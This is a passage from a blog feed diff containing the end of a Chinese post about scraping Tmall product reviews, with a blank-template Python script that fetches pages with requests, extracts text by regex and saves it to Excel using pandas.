+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/5e571cac14cb6c051fe33bafa0b52c32.png" alt="截图"></p>
+<p>这是爬下来的数据;</p>
+<p>接下来我把我写的模板代码给大家,其中的数据可以参考我上面的例子</p>
+<pre><code>import time
+import re
+import requests
+import pandas
+import openpyxl
+
+headers = &#123;
+    &quot;cookie&quot;: &quot;&quot;, 
+    &quot;referer&quot;: &quot;&quot;,
+    &quot;user-agent&quot;: &quot;&quot;,
+&#125;
+# 模拟浏览器用户
+texts = []
+for n in range(0, 5): #选择爬取页数
+    url = &#39;&#39;
+    time.sleep(5)#设置延迟时间,太快容易被发现引发反爬虫系统
+    data = requests.get(url, headers=headers).text
+    pat = re.compile(&#39;&#39;)#正则匹配,匹配所有包含在这两个单词之间的数据
+    texts.extend(pat.findall(data))#将数据拼接到texts列表中
+    print(&#39;爬完了第&#39; + str(n) + &#39;页&#39;)
+df = pandas.DataFrame()#使用pandas包,将数据导入的xlsx表格
+df[&#39;&#39;] = texts
+df.to_excel(&#39;.xlsx&#39;)
+</code></pre>
+<p>好了,今天关于爬虫的简单介绍就到这里啦.</p>
+]]></content>
+      <categories>
+        <category>一些日常</category>
+      </categories>
+      <tags>
+        <tag>一些日常</tag>
+      </tags>
+  </entry>
+</search>
